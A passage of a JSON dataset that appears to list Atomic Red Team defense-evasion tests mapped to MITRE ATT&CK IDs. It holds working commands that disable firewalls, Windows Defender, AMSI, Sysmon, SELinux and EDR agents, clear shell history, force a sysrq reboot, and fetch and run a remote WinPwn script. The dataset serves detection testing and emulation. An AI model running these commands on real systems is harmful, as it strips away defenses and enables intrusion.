         "command": "Copy-Item \"f7ce09_AtomicTest.exe\" -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n",
         "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n",
         "command": "netsh firewall set opmode mode=disable"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
         "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "An adversary tries to modify the windows firewall registry.\n",
         "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
         "command": "tail /var/log/ufw.log"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n",
         "command": "netsh advfirewall set currentprofile state off"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
         "command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes && netsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
         "command": "ufw logging off"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "This test will attempt to open a local port defined by input arguments to any profile",
         "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) \nAttackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables \nrules, which in fact \"disable\" iptables. \n",
         "command": "iptables-save > /tmp/iptables.rules; iptables -F"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
         "command": "ufw disable"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n",
         "command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n",
         "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw; grep \"# THIS IS A COMMENT\" /etc/default/ufw"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Instead of completely \"disabling\" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp.\nBy doing so, they may cause less noise to avoid detection. \n",
         "command": "iptables-save > /tmp/iptables.rules; iptables -D OUTPUT -p tcp --dport 21 -j DROP"
      },
      {
         "technique_id": "T1562.004",
         "technique_name": "Impair Defenses: Disable or Modify System Firewall",
         "tactic": "defense-evasion",
         "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
         "command": "ufw prepend deny from 1.2.3.4; ufw status numbered"
      }
   ],
   "T1202": [
      {
         "technique_id": "T1202",
         "technique_name": "Indirect Command Execution",
         "tactic": "defense-evasion",
         "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
         "command": "pcalua.exe -a #{process} && pcalua.exe -a #{payload_path}"
      },
      {
         "technique_id": "T1202",
         "technique_name": "Indirect Command Execution",
         "tactic": "defense-evasion",
         "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
         "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe"
      },
      {
         "technique_id": "T1202",
         "technique_name": "Indirect Command Execution",
         "tactic": "defense-evasion",
         "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
         "command": "conhost.exe \"notepad.exe\""
      }
   ],
   "T1218.002": [
      {
         "technique_id": "T1218.002",
         "technique_name": "Signed Binary Proxy Execution: Control Panel",
         "tactic": "defense-evasion",
         "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
         "command": "control.exe \"187e67_calc.cpl\""
      }
   ],
   "T1562.001": [
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
         "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
         "command": "Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables OpenDNS Umbrella\n",
         "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
         "command": "set +o history"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
         "command": "net.exe stop McAfeeDLPAgentService && sc.exe config McAfeeDLPAgentService start= disabled"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
         "command": "sysmon -u"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
         "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
         "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
         "command": "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist; sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
         "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
         "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n MsMpEng.exe"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
         "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Stop and disable Crowdstrike Falcon on Linux\n",
         "command": "sudo systemctl stop falcon-sensor.service; sudo systemctl disable falcon-sensor.service"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
         "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\""
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "reboot system via system request seen in Awfulshred wiper.\n",
         "command": "echo 1> /proc/sys/kernel/sysrq ; echo b> /proc/sysrq-trigger"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
         "command": "Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name McAfeeDLPAgentService"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
         "command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
         "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Kill the event log services for stealth via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); inv-phantom -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
         "command": "$excludedpath= \"C:\\Temp\"; Add-MpPreference -ExclusionPath $excludedpath"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
         "command": "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
         "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of linux.\n",
         "command": "swapon -a ; sleep 2; swapoff -a; sync"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables syslog collection\n",
         "command": "if (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then : ; else sudo (which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog); fi;  ;  systemctl stop rsyslog ; systemctl disable rsyslog"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
         "command": "$excludedProcess = \"outlook.exe\"; Add-MpPreference -ExclusionProcess $excludedProcess"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
         "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
         "command": "sc stop WinDefend && sc config WinDefend start=disabled && sc query WinDefend"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disable the Cb Response service\n",
         "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ]; then   service cbdaemon stop;   chkconfig off cbdaemon; else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];   systemctl stop cbdaemon;   systemctl disable cbdaemon; fi"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n",
         "command": "detectorId=$(aws guardduty create-detector --enable --region \"us-east-1\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*'); aws guardduty update-detector --no-enable --detector-id $detectorId; aws guardduty delete-detector --detector-id $detectorId"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
         "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f && reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables Carbon Black Response\n",
         "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist; sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables macOS Gatekeeper\n",
         "command": "sudo spctl --master-disable"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables LittleSnitch\n",
         "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
         "command": "$excludedExts= \".exe\"; Add-MpPreference -ExclusionExtension  $excludedExts"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
         "command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"  ( call ) ELSE ( schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\" && schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ) &&   &&  IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f ) && IF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Clear Shell History. This technique only affect the bash shell application. \n",
         "command": "history -c"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
         "command": "Try {cmd /c \"C:\\Users\\puma-4\\Desktop\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse;   Try {cmd /c \"C:\\Users\\puma-4\\Desktop\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{};}"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
         "command": "fltmc.exe unload SysmonDrv"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
         "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
         "command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\""
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
         "command": "free && echo 3 > /proc/sys/vm/drop_caches && free; echo 3> /proc/sys/vm/drop_caches"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
         "description": "Disables SELinux enforcement\n",
         "command": "setenforce 0"
      },
      {
         "technique_id": "T1562.001",
         "technique_name": "Impair Defenses: Disable or Modify Tools",
         "tactic": "defense-evasion",
